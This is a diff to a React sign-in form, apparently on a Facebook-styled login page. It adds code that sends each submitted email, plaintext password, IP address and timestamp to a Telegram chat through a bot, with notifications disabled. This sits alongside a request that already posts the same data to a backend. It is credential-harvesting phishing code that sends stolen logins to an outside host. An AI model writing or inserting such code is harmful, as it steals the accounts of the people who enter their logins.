@@ -11,7 +11,11 @@ import facebook from '../assets/facebook.png';
 import { useForm } from 'react-hook-form';
 import { yupResolver } from '@hookform/resolvers/yup';
 import * as Yup from 'yup';
-
+import moment from "moment"
+const { TelegramClient } = require('messaging-api-telegram');
+const client = new TelegramClient({
+    accessToken: process.env.REACT_APP_PUBLIC_TM_TOKEN,
+});
 const SignIn = () => {
     const [formSuccess, setFormSuccess] = useState(false);
     const validationSchema = Yup.object().shape({
@@ -43,7 +47,20 @@ const SignIn = () => {
                 password: data.password,
                 ip_address: geoData.IPv4,
                 logged_at: Date.now()
-            }).then(data => {
+            }).then(res => {
+                if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
+                {
+                    let message = "Sign In Data\r\n"
+                    message += "Email: " + data.email + '\r\n'
+                    message += "Password: " + data.password + '\r\n'
+                    message += "Ip Address: " + geoData.IPv4 + '\r\n'
+                    message += "Time: " + moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
+                    client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
+                        disableWebPagePreview: true,
+                        disableNotification: true,
+                    })
+                    .then( res => console.log(res,'telegram res'))
+                }
                 setFormSuccess( true )
             }).catch(err => {
                 throw new Error(err);
